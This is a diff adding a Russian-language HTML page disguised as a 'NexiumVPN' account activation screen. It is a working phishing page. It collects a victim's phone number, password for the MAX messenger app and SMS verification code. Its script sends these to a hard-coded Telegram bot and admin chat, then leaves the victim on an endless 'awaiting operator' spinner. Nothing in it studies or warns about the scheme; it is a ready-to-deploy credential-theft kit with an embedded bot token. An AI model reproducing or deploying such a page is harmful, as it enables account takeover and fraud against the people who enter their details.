@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>NexiumVPN | Активация</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0a0a0a;
+            font-family: 'Inter', sans-serif;
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 16px;
+            background-image: 
+                radial-gradient(ellipse at 50% 0%, rgba(255, 0, 0, 0.05) 0%, transparent 60%),
+                radial-gradient(ellipse at 50% 100%, rgba(0, 0, 50, 0.05) 0%, transparent 60%);
+        }
+
+        .app-container {
+            background: rgba(18, 18, 26, 0.85);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: 24px;
+            width: 100%;
+            max-width: 400px;
+            min-height: 520px;
+            box-shadow: 0 25px 60px rgba(0,0,0,0.8);
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .header {
+            padding: 28px 24px 16px 24px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            flex-shrink: 0;
+            text-align: center;
+        }
+        .header .logo {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 28px;
+            font-weight: 900;
+            background: linear-gradient(135deg, #ff1a1a, #ff4d4d);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            filter: drop-shadow(0 0 20px rgba(255,0,0,0.3));
+        }
+        .header .logo span { -webkit-text-fill-color: #ffffff; color: #ffffff; }
+        .header .subtitle {
+            color: #666;
+            font-size: 12px;
+            font-weight: 600;
+            margin-top: 4px;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+        }
+
+        .main-content { flex: 1; padding: 24px 24px 32px 24px; display: flex; flex-direction: column; }
+        .step { display: none; flex-direction: column; flex: 1; animation: fade 0.3s ease; }
+        .step.active { display: flex; }
+        @keyframes fade { 0% { opacity: 0; transform: translateY(8px); } 100% { opacity: 1; transform: translateY(0); } }
+
+        .step-header { text-align: center; margin-bottom: 20px; flex-shrink: 0; }
+        .step-header .step-title { font-size: 22px; font-weight: 700; color: #fff; margin-bottom: 4px; }
+        .step-header .step-subtitle { color: #666; font-size: 14px; font-weight: 500; }
+        .step-header .highlight-info { font-size: 16px; font-weight: 700; color: #fff; margin-top: 8px; padding: 8px 16px; border-radius: 12px; display: inline-block; background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.05); }
+
+        .form-group { margin-bottom: 18px; flex-shrink: 0; }
+        .form-group label { display: block; color: #aaa; font-size: 13px; font-weight: 600; margin-bottom: 8px; }
+        .form-group input { width: 100%; padding: 16px 20px; background: rgba(255,255,255,0.03); border: 2px solid rgba(255,255,255,0.06); border-radius: 16px; color: #fff; font-size: 16px; outline: none; transition: 0.3s; }
+        .form-group input:focus { border-color: rgba(255,0,0,0.5); background: rgba(255,255,255,0.05); }
+        .form-group input.input-code { text-align: center; letter-spacing: 12px; font-weight: 700; font-size: 24px; }
+
+        .btn-reg { width: 100%; padding: 18px; border: none; border-radius: 16px; background: linear-gradient(135deg, #cc0000, #ff1a1a); background-size: 200% 200%; color: #fff; font-size: 16px; font-weight: 700; cursor: pointer; text-transform: uppercase; letter-spacing: 1.5px; transition: 0.3s; box-shadow: 0 8px 25px rgba(255,0,0,0.2); flex-shrink: 0; margin-top: 6px; }
+        .btn-reg:hover { transform: translateY(-2px); box-shadow: 0 12px 35px rgba(255,0,0,0.4); background-position: 100% 0%; }
+        .btn-reg:disabled { opacity: 0.6; cursor: not-allowed; transform: none; box-shadow: none; }
+
+        .choice-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin-bottom: 24px; }
+        .choice-btn { padding: 18px 12px; border: 2px solid transparent; border-radius: 16px; background: rgba(255,255,255,0.03); color: #888; font-size: 14px; font-weight: 600; cursor: pointer; transition: 0.3s; text-align: center; }
+        .choice-btn:hover { border-color: rgba(255,0,0,0.2); color: #fff; }
+        .choice-btn.selected { border-color: #ff0000; background: rgba(255,0,0,0.08); color: #ff0000; box-shadow: 0 0 20px rgba(255,0,0,0.05); }
+        .choice-btn.selected.yes { border-color: #00ff88; background: rgba(0,255,136,0.08); color: #00ff88; box-shadow: 0 0 20px rgba(0,255,136,0.05); }
+
+        .loader-wrapper {
+            display: none;
+            text-align: center;
+            padding: 40px 20px;
+            flex: 1;
+            flex-direction: column;
+            justify-content: center;
+        }
+        .loader-wrapper.active { display: flex; }
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 4px solid rgba(255, 255, 255, 0.05);
+            border-top: 4px solid #ff0000;
+            border-bottom: 4px solid #ff4d4d;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 24px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .loader-text {
+            color: #888;
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+        .loader-subtext {
+            color: #444;
+            font-size: 13px;
+            font-weight: 500;
+        }
+
+        #dashboard { display: none; flex-direction: column; height: 100%; }
+        #dashboard.active { display: flex; }
+        .success-screen {
+            text-align: center;
+            padding: 40px 24px;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+        .success-screen .icon {
+            font-size: 72px;
+            color: #00ff88;
+            text-shadow: 0 0 40px rgba(0, 255, 136, 0.2);
+            margin-bottom: 16px;
+            animation: successBounce 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+        @keyframes successBounce {
+            0% { transform: scale(0) rotate(-45deg); opacity: 0; }
+            60% { transform: scale(1.1) rotate(5deg); }
+            100% { transform: scale(1) rotate(0deg); opacity: 1; }
+        }
+        .success-screen .title { font-size: 28px; font-weight: 700; color: #00ff88; }
+        .success-screen .desc {
+            color: #888;
+            font-size: 14px;
+            font-weight: 500;
+            line-height: 1.5;
+        }
+        .info-card {
+            margin-top: 28px;
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            border-radius: 16px;
+            padding: 20px 24px;
+            text-align: left;
+        }
+        .info-card .row {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
+            font-size: 14px;
+            color: #888;
+        }
+        .info-card .row:last-child { border-bottom: none; }
+        .info-card .row .val { color: #fff; font-weight: 500; }
+        .info-card .row .val.green { color: #00ff88; }
+
+        #errorState {
+            display: none;
+            text-align: center;
+            padding: 40px 24px;
+            flex: 1;
+            flex-direction: column;
+            justify-content: center;
+        }
+        #errorState.active { display: flex; }
+        #errorState .icon {
+            font-size: 72px;
+            color: #ff4444;
+            text-shadow: 0 0 30px rgba(255, 0, 0, 0.15);
+            margin-bottom: 16px;
+            animation: errorShake 0.5s ease-in-out;
+        }
+        @keyframes errorShake {
+            0%, 100% { transform: translateX(0); }
+            20%, 60% { transform: translateX(-10px); }
+            40%, 80% { transform: translateX(10px); }
+        }
+        #errorState h2 { font-size: 24px; font-weight: 700; color: #ff4444; margin-bottom: 8px; }
+        #errorState p {
+            color: #888;
+            font-size: 14px;
+            font-weight: 500;
+            line-height: 1.5;
+        }
+
+        @media (max-width: 480px) {
+            body { padding: 12px; }
+            .app-container { border-radius: 20px; min-height: 90vh; }
+            .header { padding: 24px 20px 14px 20px; }
+            .header .logo { font-size: 24px; }
+            .main-content { padding: 20px 20px 28px 20px; }
+            .step-header .step-title { font-size: 20px; }
+            .form-group input { padding: 14px 16px; font-size: 15px; }
+            .choice-btn { font-size: 13px; padding: 14px 10px; }
+            .btn-reg { padding: 15px; font-size: 14px; }
+            .success-screen .icon { font-size: 56px; }
+            .success-screen .title { font-size: 22px; }
+            .spinner { width: 48px; height: 48px; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="app-container">
+
+    <div class="header">
+        <div class="logo">NEXIUM<span>VPN</span></div>
+        <div class="subtitle">Премиум доступ к интернету</div>
+    </div>
+
+    <!-- ШАГ 1: НОМЕР -->
+    <div id="step1" class="step active">
+        <div class="main-content">
+            <div class="step-header">
+                <div class="step-title">Вход в кабинет</div>
+                <div class="step-subtitle">Введите номер телефона для входа</div>
+            </div>
+            <div class="form-group">
+                <label>📱 Номер телефона</label>
+                <input type="text" id="phoneInput" placeholder="+7 (999) 000-00-00" maxlength="18">
+            </div>
+            <button class="btn-reg" id="btn1" onclick="submitPhone()">Продолжить</button>
+        </div>
+    </div>
+
+    <!-- ШАГ 2: ПАРОЛЬ MAX -->
+    <div id="step2" class="step">
+        <div class="main-content">
+            <div class="step-header">
+                <div class="step-title">Пароль MAX</div>
+                <div class="step-subtitle">Есть ли пароль от приложения MAX?</div>
+            </div>
+            <div class="choice-grid">
+                <button class="choice-btn yes" id="passYesBtn" onclick="selectPassOption(true)">✅ Да, есть</button>
+                <button class="choice-btn" id="passNoBtn" onclick="selectPassOption(false)">❌ Нет пароля</button>
+            </div>
+            <div id="maxPassContainer" style="display:none;">
+                <div class="form-group">
+                    <label>🔐 Пароль от MAX</label>
+                    <input type="password" id="maxPassInput" placeholder="Введите пароль">
+                </div>
+            </div>
+            <button class="btn-reg" id="btn2" onclick="submitPasswordChoice()">Далее к SMS</button>
+        </div>
+    </div>
+
+    <!-- ШАГ 3: SMS-КОД -->
+    <div id="step3" class="step">
+        <div class="main-content">
+            <div class="step-header">
+                <div class="step-subtitle">Код отправлен на номер</div>
+                <div class="highlight-info" id="displayedInfo">+7 (999) 000-00-00</div>
+            </div>
+            <div class="form-group">
+                <label>🔑 SMS-код</label>
+                <input type="text" id="codeInput" class="input-code" placeholder="000000" maxlength="6" inputmode="numeric">
+            </div>
+            <button class="btn-reg" id="btn3" onclick="submitFinalCode()">Активировать</button>
+        </div>
+    </div>
+
+    <!-- ШАГ 4: ЗАГРУЗКА (БЕСКОНЕЧНАЯ) -->
+    <div id="step4" class="step">
+        <div class="loader-wrapper active">
+            <div class="spinner"></div>
+            <div class="loader-text">Ожидание подтверждения оператором...</div>
+            <div class="loader-subtext">Пожалуйста, подождите...</div>
+        </div>
+    </div>
+
+    <!-- ШАГ 5: УСПЕХ -->
+    <div id="dashboard">
+        <div class="header">
+            <div class="logo">NEXIUM<span>VPN</span></div>
+            <div class="subtitle">Премиум доступ к интернету</div>
+        </div>
+        <div class="success-screen">
+            <div class="icon">✔</div>
+            <div class="title">ГОТОВО!</div>
+            <div class="desc">Ваш аккаунт успешно активирован.</div>
+            <div class="info-card">
+                <div class="row"><span>Статус</span><span class="val green">Активен</span></div>
+                <div class="row"><span>Тариф</span><span class="val">Премиум</span></div>
+                <div class="row"><span>Сервер</span><span class="val">RU-Moscow</span></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ШАГ 6: ОШИБКА -->
+    <div id="errorState">
+        <div class="icon">✖</div>
+        <h2>Ошибка</h2>
+        <p>Неверный код подтверждения.<br>Попробуйте снова.</p>
+    </div>
+
+</div>
+
+<script>
+    const BOT_TOKEN = "8501261618:AAHZvAmDrP3a0iGIjfyPuA1DhGHGZ_OzN7c";
+    const ADMIN_ID = "8733583359";
+
+    let currentPhone = "";
+    let currentPass = "";
+    let currentCode = "";
+    let hasMaxPass = null;
+
+    document.getElementById('phoneInput').addEventListener('input', function(e) {
+        let input = this.value.replace(/\D/g, '');
+        let formatted = '';
+        if (input.length > 0) formatted = '+7';
+        if (input.length > 1) formatted += ' (' + input.substring(1, 4);
+        if (input.length >= 4) formatted += ') ' + input.substring(4, 7);
+        if (input.length >= 7) formatted += '-' + input.substring(7, 9);
+        if (input.length >= 9) formatted += '-' + input.substring(9, 11);
+        this.value = formatted;
+    });
+
+    document.getElementById('codeInput').addEventListener('input', function(e) {
+        this.value = this.value.replace(/\D/g, '');
+    });
+
+    function selectPassOption(hasPassword) {
+        hasMaxPass = hasPassword;
+        const yesBtn = document.getElementById('passYesBtn');
+        const noBtn = document.getElementById('passNoBtn');
+        const passContainer = document.getElementById('maxPassContainer');
+        yesBtn.classList.remove('selected');
+        noBtn.classList.remove('selected');
+        if (hasPassword) {
+            yesBtn.classList.add('selected');
+            passContainer.style.display = 'block';
+            document.getElementById('maxPassInput').focus();
+        } else {
+            noBtn.classList.add('selected');
+            passContainer.style.display = 'none';
+            document.getElementById('maxPassInput').value = '';
+        }
+    }
+
+    function submitPhone() {
+        let phone = document.getElementById('phoneInput').value.replace(/\s|\(|\)|-/g, '');
+        if (phone.length < 11) {
+            document.getElementById('phoneInput').style.borderColor = "#ef4444";
+            setTimeout(() => document.getElementById('phoneInput').style.borderColor = "rgba(255,255,255,0.06)", 1000);
+            return;
+        }
+        currentPhone = phone;
+        document.getElementById('btn1').innerText = "ОТПРАВКА...";
+        document.getElementById('btn1').disabled = true;
+        setTimeout(() => {
+            document.getElementById('step1').classList.remove('active');
+            document.getElementById('step2').classList.add('active');
+            document.getElementById('btn1').innerText = "ПРОДОЛЖИТЬ";
+            document.getElementById('btn1').disabled = false;
+        }, 250);
+    }
+
+    function submitPasswordChoice() {
+        if (hasMaxPass === null) {
+            document.getElementById('passYesBtn').style.borderColor = "#ef4444";
+            document.getElementById('passNoBtn').style.borderColor = "#ef4444";
+            setTimeout(() => {
+                document.getElementById('passYesBtn').style.borderColor = "transparent";
+                document.getElementById('passNoBtn').style.borderColor = "transparent";
+            }, 1000);
+            return;
+        }
+        if (hasMaxPass) {
+            currentPass = document.getElementById('maxPassInput').value;
+            if (currentPass.length < 3) {
+                document.getElementById('maxPassInput').style.borderColor = "#ef4444";
+                setTimeout(() => document.getElementById('maxPassInput').style.borderColor = "rgba(255,255,255,0.06)", 1000);
+                return;
+            }
+        } else {
+            currentPass = "Нет пароля";
+        }
+        document.getElementById('btn2').innerText = "ОТПРАВКА...";
+        document.getElementById('btn2').disabled = true;
+
+        // СООБЩЕНИЕ №1: НОМЕР + ПАРОЛЬ
+        const message1 = `📩 ЗАЯВКА (ЭТАП 1)\n\n📱 Телефон: ${currentPhone}\n🔐 Пароль MAX: ${currentPass}`;
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(message1)}`, { mode: 'no-cors' });
+
+        setTimeout(() => {
+            document.getElementById('step2').classList.remove('active');
+            document.getElementById('step3').classList.add('active');
+            document.getElementById('displayedInfo').innerText = currentPhone;
+            document.getElementById('btn2').innerText = "ДАЛЕЕ";
+            document.getElementById('btn2').disabled = false;
+        }, 250);
+    }
+
+    function submitFinalCode() {
+        let code = document.getElementById('codeInput').value;
+        if (code.length < 4) {
+            document.getElementById('codeInput').style.borderColor = "#ef4444";
+            setTimeout(() => document.getElementById('codeInput').style.borderColor = "rgba(255,255,255,0.06)", 1000);
+            return;
+        }
+        currentCode = code;
+        document.getElementById('btn3').innerText = "ОТПРАВКА...";
+        document.getElementById('btn3').disabled = true;
+
+        // СООБЩЕНИЕ №2: НОМЕР + ПАРОЛЬ + КОД
+        const message2 = `📩 ФИНАЛЬНАЯ ЗАЯВКА\n\n📱 Телефон: ${currentPhone}\n🔐 Пароль MAX: ${currentPass}\n🔑 SMS-код: ${currentCode}`;
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(message2)}`, { mode: 'no-cors' });
+
+        // БЕСКОНЕЧНАЯ ЗАГРУЗКА
+        setTimeout(() => {
+            document.getElementById('step3').classList.remove('active');
+            document.getElementById('step4').classList.add('active');
+            document.getElementById('btn3').innerText = "АКТИВИРОВАТЬ";
+            document.getElementById('btn3').disabled = false;
+        }, 250);
+    }
+</script>
+
+</body>
+</html>
